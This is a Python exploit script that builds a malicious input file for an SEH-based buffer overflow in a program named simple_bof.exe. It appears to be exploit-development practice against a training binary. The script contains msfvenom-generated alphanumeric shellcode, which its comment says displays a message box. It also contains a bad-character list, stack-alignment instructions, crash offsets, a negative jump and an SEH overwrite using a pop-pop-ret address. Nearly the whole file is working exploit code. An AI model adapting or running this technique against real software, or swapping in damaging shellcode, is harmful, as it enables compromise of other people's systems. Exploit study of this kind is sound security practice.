import sys, struct

filename = "overflow_simple-bof.txt"

# Shellcode
# cat msgbox_hodor.bin | msfvenom -a x86 --platform windows -e x86/alpha_upper -f python -v shellcode -b "\x0a\x0d\x00" -
# Payload size: 287 bytes
shellcode =  ""
shellcode += "\x89\xe3\xda\xd6\xd9\x73\xf4\x5d\x55\x59\x49\x49"
shellcode += "\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54"
shellcode += "\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48"
shellcode += "\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41"
shellcode += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58"
shellcode += "\x50\x38\x41\x43\x4a\x4a\x49\x56\x51\x38\x52\x4a"
shellcode += "\x4b\x47\x43\x46\x39\x4d\x58\x36\x31\x45\x5a\x4f"
shellcode += "\x4b\x51\x4c\x50\x39\x5a\x43\x43\x47\x36\x31\x4b"
shellcode += "\x4f\x4e\x33\x5a\x4b\x37\x45\x56\x39\x30\x31\x48"
shellcode += "\x52\x4b\x38\x56\x31\x34\x4b\x36\x31\x56\x30\x4f"
shellcode += "\x4b\x39\x43\x36\x53\x4d\x33\x52\x57\x4b\x4f\x4e"
shellcode += "\x33\x4a\x4b\x56\x55\x50\x59\x50\x31\x39\x42\x4b"
shellcode += "\x38\x46\x31\x34\x4f\x31\x42\x31\x42\x36\x31\x36"
shellcode += "\x31\x30\x52\x4b\x4f\x38\x50\x4e\x58\x30\x4f\x47"
shellcode += "\x51\x5a\x43\x42\x57\x4b\x4f\x58\x50\x4a\x48\x48"
shellcode += "\x48\x4b\x4f\x4b\x4f\x4b\x4f\x42\x55\x42\x53\x45"
shellcode += "\x35\x42\x52\x56\x53\x46\x52\x36\x4e\x32\x44\x42"
shellcode += "\x4c\x32\x4c\x50\x4e\x4d\x38\x59\x56\x4b\x4f\x4b"
shellcode += "\x4f\x4b\x4f\x30\x4d\x45\x35\x53\x43\x34\x33\x35"
shellcode += "\x31\x55\x37\x32\x45\x30\x42\x52\x4f\x32\x58\x51"
shellcode += "\x51\x30\x4e\x4b\x58\x49\x56\x4b\x4f\x4b\x4f\x4b"
shellcode += "\x4f\x31\x58\x30\x4f\x37\x34\x50\x4f\x36\x32\x47"
shellcode += "\x38\x50\x4f\x30\x44\x30\x4f\x30\x52\x47\x38\x50"
shellcode += "\x4f\x47\x34\x50\x4f\x46\x32\x30\x4e\x41\x41"

# Badchars
badchars = (
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
        )

# Align ESP
align_esp = (
                "\x54"              # PUSH ESP
                "\x58"              # POP EAX
                "\x66\x05\x56\x05"  # ADD AX, 0x556
                "\x50"              # PUSH EAX
                "\x5c"              # POP ESP
)

# NOP's
nop = "\x41" * 32

# Maximum length
maxlen = 5000

# Offsets
crash_ebp = 512                                     # Buffer length 344
crash_edx = 856
crash_ecx = 860                                     # Buffer length 140
crash_nseh = 796                                    # Buffer length 52
ret_nseh_jmp = 704                                  # Space for first buffer after NSEH negative JMP

# Negative jump to jump back to beginning of buffer
neg_jmp = "\xE9\x43\xFD\xFF\xFF"                    # jmp 0xfffffd48

# Building variables
prefix = "A" * 8
prefix += align_esp
prefix += nop
prefix += shellcode
prefix += "B" * (ret_nseh_jmp - len(prefix))
prefix += neg_jmp
prefix += "C" * (crash_nseh - len(prefix))
nseh = "\x4c\x4c\x77\xa0"                           # DEC ESP # DEC ESP # JA SHORT
seh = struct.pack("<L", 0x00401758)                 # pop esi # pop edi # ret  # simple_bof.exe
suffix = "D" * (maxlen - len(prefix + nseh + seh))

# Crafting payload
payload = prefix + nseh + seh + suffix

f = open(filename, 'wb')
f.write(payload)
f.close()

